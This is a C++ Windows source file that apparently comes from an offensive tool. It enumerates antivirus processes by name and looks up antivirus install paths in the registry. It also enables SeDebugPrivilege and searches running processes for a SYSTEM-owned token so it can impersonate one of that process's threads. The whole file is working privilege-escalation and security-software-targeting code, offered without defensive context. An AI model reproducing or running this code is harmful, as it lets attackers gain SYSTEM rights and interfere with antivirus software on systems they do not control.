#include "MainHeader.h"

//Search av_process name here
unsigned int EnumProc (std::wstring process_name,std::vector <unsigned int> &array_PID)
{
	HANDLE hProcessSnap;
	unsigned int pid_ =0;
	PROCESSENTRY32 pe32;
	int i=0;
	hProcessSnap=CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if (hProcessSnap!=INVALID_HANDLE_VALUE )
	{
		pe32.dwSize = sizeof( PROCESSENTRY32 );
		if(Process32First( hProcessSnap, &pe32 ))
		{
			do
			{
				if (!wcscmp(process_name.c_str(),pe32.szExeFile))
				{	
					array_PID.resize(array_PID.size()+1);
					array_PID[i]=pe32.th32ProcessID;
					pid_=pe32.th32ProcessID;
					i++;
				}
			}
			while(Process32Next(hProcessSnap, &pe32 ));
		}
		CloseHandle( hProcessSnap );
	}
	return pid_;
}


//Adjust priv function,check linked token (UAC),check existence of privilege
int  AdjustPriv (unsigned int priv_)
{
	//return value
	//statusRet=0 - FailAdjust <Vista
	//statusRet=1 - AdjustOk
	//statusRet=2 - FailAdjustLinkedToken

	NTSTATUS st;
	BOOL enablepriv;
	TOKEN_LINKED_TOKEN token_struct;
	TOKEN_PRIVILEGES*   token_priv_struct;
	ULONG ret_length;
	unsigned int statusRet,i;
	HANDLE TokenHandle;
	HANDLE heap_1;
	LPVOID heap_addr;
	LUID_AND_ATTRIBUTES array_luid;
	statusRet=0;

	heap_1=Heap_init();
	if (heap_1==0)
		return 0;

	if (!NT_SUCCESS (RtlAdjustPrivilege (priv_,true,0,(PBOOLEAN)&enablepriv)))
	{
		if (NT_SUCCESS(NtOpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&TokenHandle)))
		{
			if (NT_SUCCESS(NtQueryInformationToken(TokenHandle,TokenLinkedToken,&token_struct,
													 sizeof(TOKEN_LINKED_TOKEN),&ret_length)))
			{
				ret_length=sizeof(TOKEN_PRIVILEGES);
				statusRet+=1;
				do
				{
					heap_addr=HeapAlloc(heap_1,HEAP_ZERO_MEMORY,ret_length);
					if (heap_addr==NULL)
						return 0;
			
					st=NtQueryInformationToken(token_struct.LinkedToken,TokenPrivileges,
											   (TOKEN_PRIVILEGES*)heap_addr,ret_length,&ret_length);
					if (st==STATUS_BUFFER_TOO_SMALL)
						HeapReAlloc(heap_1,HEAP_ZERO_MEMORY,heap_addr,ret_length);
				}
				while (st==STATUS_BUFFER_TOO_SMALL);
			
				if(NT_SUCCESS(st))
				{ 
					token_priv_struct=(TOKEN_PRIVILEGES*)heap_addr;
					if (token_priv_struct==NULL)
						return 0;
					for (i=0;i<token_priv_struct->PrivilegeCount;i++)
					{
						array_luid=token_priv_struct->Privileges[i];
						if (array_luid.Luid.LowPart==priv_)
						{
							statusRet+=1;
							break;
						}
					}
					NtClose(token_struct.LinkedToken);
					HeapFree(heap_1,0,heap_addr);
				}	
			}
			NtClose(TokenHandle);
		}
	}
	else
		statusRet+=1;
	return statusRet;
}

BOOL IsUserAdmin(void)
/*++ 
Routine Description: This routine returns TRUE if the caller's
process is a member of the Administrators local group. Caller is NOT
expected to be impersonating anyone and is expected to be able to
open its own process and process token. 
Arguments: None. 
Return Value: 
   TRUE - Caller has Administrators local group. 
   FALSE - Caller does not have Administrators local group. --
*/ 
{
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup; 

	b = AllocateAndInitializeSid(&NtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,
								 0, 0, 0, 0, 0, 0,&AdministratorsGroup); 
	if(b) 
	{
		if (!CheckTokenMembership( NULL, AdministratorsGroup, &b)) 
			 b = FALSE;
		FreeSid(AdministratorsGroup); 
	}
	return(b);
}

NTSTATUS Query_Procsinfo (LPVOID* buffer_,SYSTEM_INFORMATION_CLASS sys_inf_class)
{
	ULONG prev_length=0;
	ULONG length_=0;
	NTSTATUS status_;
	
	while(1)
	{
		status_=NtQuerySystemInformation(sys_inf_class,*buffer_,prev_length,&length_);
		if (status_!=STATUS_INFO_LENGTH_MISMATCH)
			break;
		if (prev_length!=0)
			VirtualFree(*buffer_,NULL,MEM_RELEASE);
		prev_length=length_;
		*buffer_=VirtualAlloc(NULL,prev_length,MEM_COMMIT,PAGE_READWRITE);	
		if (!buffer_)
			break;
	}

	return status_;
}
NTSTATUS Query_TokenInfo (LPVOID* buffer_,HANDLE token_handle,
						  TOKEN_INFORMATION_CLASS token_inf_class)
{
	ULONG prev_length=0;
	ULONG length_=0;
	NTSTATUS status_;

	while(1)
	{
		status_=NtQueryInformationToken(token_handle,TokenPrimaryGroup,
													*buffer_,prev_length,&length_);
		if (status_!=STATUS_BUFFER_TOO_SMALL)
			break;
		if (prev_length!=0)
			VirtualFree(*buffer_,NULL,MEM_RELEASE);
		prev_length=length_;
		*buffer_=VirtualAlloc(NULL,prev_length,MEM_COMMIT,PAGE_READWRITE);
		if (!buffer_)
			break;
	}
	return status_;
}
bool CheckToken_group (PTOKEN_PRIMARY_GROUP tn_group)
{
	PSID sid_local_system;
	PULONG sid_sub_auth;
	SID_IDENTIFIER_AUTHORITY id_authority=SECURITY_NT_AUTHORITY;
	bool status_=false;
	
	sid_local_system=(PSID)VirtualAlloc(NULL,SECURITY_MAX_SID_SIZE,MEM_COMMIT,PAGE_READWRITE);
	if(sid_local_system)
	{
		//init well known sid S-1-5-18 for comparing
		if (NT_SUCCESS(RtlInitializeSid(sid_local_system,&id_authority,sub_count)))
		{
			sid_sub_auth=RtlSubAuthoritySid(sid_local_system,NULL);
			if (sid_sub_auth)
			{
				(*sid_sub_auth)=SECURITY_LOCAL_SYSTEM_RID;
				//Compare
				if(RtlEqualSid(sid_local_system,tn_group->PrimaryGroup))
					status_=true;
			}
		}
		VirtualFree(sid_local_system,NULL,MEM_RELEASE);
	}
	return status_;
}
bool Impersonate_ThreadToken (PCLIENT_ID clientId_str)
{
	SECURITY_QUALITY_OF_SERVICE security_struct;
	OBJECT_ATTRIBUTES object_attr;
	HANDLE thread_handle;

	bool status_=false;

	InitializeObjectAttributes(&object_attr,NULL,NULL,NULL,NULL);

	security_struct.Length=sizeof(SECURITY_QUALITY_OF_SERVICE);
	security_struct.ImpersonationLevel=SecurityImpersonation;
	security_struct.ContextTrackingMode=SECURITY_DYNAMIC_TRACKING;
	security_struct.EffectiveOnly=false;

	if (NT_SUCCESS(NtOpenThread(&thread_handle,THREAD_DIRECT_IMPERSONATION,&object_attr,clientId_str)))
	{
		if (NT_SUCCESS(NtImpersonateThread((HANDLE)CURRENT_THREAD,thread_handle,&security_struct)))
			status_=true;
		NtClose(thread_handle);
	}
	return status_;
}

bool Impersonate_Main (void)
{
	bool status_ret=false;
	NTSTATUS status_;
	PSYSTEM_PROCESSES struct_pointer;
	HANDLE process_handle,token_handle;
	OBJECT_ATTRIBUTES object_attr;
	CLIENT_ID process_id;
	CLIENT_ID thread_id;
	unsigned int i;
	PTOKEN_PRIMARY_GROUP  token_group_buff;
	
	LPVOID buffer_1=0;
	LPVOID buffer_2=0;
	
	process_id.UniqueThread=NULL;
	thread_id.UniqueProcess=NULL;
	//store information about processes
	status_=Query_Procsinfo(&buffer_1,SystemProcessInformation);
	if (NT_SUCCESS(status_) && buffer_1!=NULL)
	{	
		struct_pointer=(PSYSTEM_PROCESSES)buffer_1;
		while(struct_pointer->NextEntryOffset)
		{
			//open process
			InitializeObjectAttributes(&object_attr,NULL,NULL,NULL,NULL);
			process_id.UniqueProcess=(HANDLE)struct_pointer->UniqueProcessId;
			if (NT_SUCCESS(NtOpenProcess(&process_handle,PROCESS_QUERY_INFORMATION,
													 &object_attr,&process_id)))
			{
				//open process token for querying primary-group SID information
				if(NT_SUCCESS(NtOpenProcessToken(process_handle,TOKEN_QUERY,&token_handle)))
				{
					status_=Query_TokenInfo(&buffer_2,token_handle,TokenPrimaryGroup);				
					if (NT_SUCCESS(status_) && buffer_2!=NULL)
					{
						token_group_buff=(PTOKEN_PRIMARY_GROUP)buffer_2;
						//check System Group SID [S-1-5-18]
						if(CheckToken_group(token_group_buff))
						{
							//System SID Founded
							//now try impersonate
							for (i=0;i<struct_pointer->NumberOfThreads;i++)
							{
								if (Impersonate_ThreadToken(&(struct_pointer->Threads[i].ClientId)))
								{
									status_ret=true;
									break;
								}
							}
						}
						VirtualFree(buffer_2,NULL,MEM_RELEASE);
					}
					NtClose(token_handle);
				}
				NtClose(process_handle);
				if (status_ret)
					break;
			}
			struct_pointer=(PSYSTEM_PROCESSES((DWORD)struct_pointer+struct_pointer->NextEntryOffset));
		}
		VirtualFree(buffer_1,NULL,MEM_RELEASE);
	}
		
	return status_ret;
}

void MainPrivUtil (void)
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);  // Get handle to standard output
	if (hConsole==NULL)
	{
		std::cout<<"[-] Error in GetStdHandle function"<<std::endl;
		return;
	}
	
	//Check is user admin 
	if(IsUserAdmin())
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		std::cout <<"[+] Process token membership in the Admin local group"<<std::endl;
		
	}
	else
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
		std::cout <<"[-] Process token membership not in the Admin local group"<<std::endl;
	}
	int return_result = AdjustPriv(SeDebugPrivilege);
	
	if (return_result==ADJUST_OK)
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		std::cout <<"[+] SeDebugPrivilege adjust successful"<<std::endl;
		
		
		if (Impersonate_Main()==true)
			std::cout <<"[+] System thread impersonated"<<std::endl;
		else
		{
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
			std::cout <<"[-] System thread not impersonated"<<std::endl;
		}
		
		
	}
	else
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
		std::cout <<"[-] SeDebugPrivilege adjust failed"<<std::endl;
	}
	if (AdjustPriv(SeCreatePagefilePrivilege)==ADJUST_OK)
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		std::cout <<"[+] SeCreatePagefilePrivilege adjust successful"<<std::endl;
	}
	else
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
		std::cout <<"[-] SeCreatePagefilePrivilege adjust failed"<<std::endl;
	}
	SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE|FOREGROUND_GREEN|FOREGROUND_RED);
	
}
bool IsWow64()
{
	DWORD isWow64;
	DWORD length;
    bool bIsWow64 = FALSE;

	if(NT_SUCCESS(NtQueryInformationProcess((HANDLE)-1,ProcessWow64Information,&isWow64,4,&length)))
	{
		if (isWow64!=NULL)
			bIsWow64=true;
	}
	return bIsWow64;
}

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
    return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

bool GetAVpath(std::wstring av_reg_path,std::wstring av_reg_path_subkey,std::wstring &install_path,bool wow_64)
{
	HKEY handleReg;
	HKEY av_reg_path_key;
	DWORD dwRet;
	DWORD cbData;
	bool result_=false;
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);  // Get handle to standard output
	if (hConsole==NULL)
	{
		std::cout<<"[-] Error in GetStdHandle function"<<std::endl;
		return false;
	}

	if (IsWow64()==false || wow_64==true)
	{
		//Open Software for check
		if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,L"Software\\",0,KEY_READ,&handleReg)==ERROR_SUCCESS)
			result_=true;
	}
	else
	{
		//x64 disable WOW64 redirect
		if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,L"Software\\",0,KEY_READ | KEY_WOW64_64KEY,&handleReg)==ERROR_SUCCESS)
			result_=true;
	}
	if (result_)
	{
		if(RegOpenKeyExW(handleReg,av_reg_path.c_str(),0,KEY_QUERY_VALUE,&av_reg_path_key)==ERROR_SUCCESS)
		{
			result_=true;
			cbData=0x0;
			//Opened AV reg,now query val
			dwRet = RegQueryValueEx( av_reg_path_key,av_reg_path_subkey.c_str(),NULL,
									NULL,(LPBYTE) install_path.c_str(),&cbData );
			while( dwRet == ERROR_MORE_DATA )
			{
				// Get a buffer that is big enough.
				install_path.resize(cbData/2-1);
				dwRet = RegQueryValueExW( av_reg_path_key,av_reg_path_subkey.c_str(),NULL,NULL,
					(LPBYTE) install_path.c_str(),&cbData );
			}
			if( dwRet != ERROR_SUCCESS )
				result_=false;
			//else
				//std::wcout << "[*] AV install path: "<<install_path << std::endl;
			RegCloseKey(av_reg_path_key);
			RegCloseKey(handleReg);
		}
	}
	if (result_==false)
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
		std::wcout<<"[-] AV directory not found"<<std::endl;
	}
	return result_;
}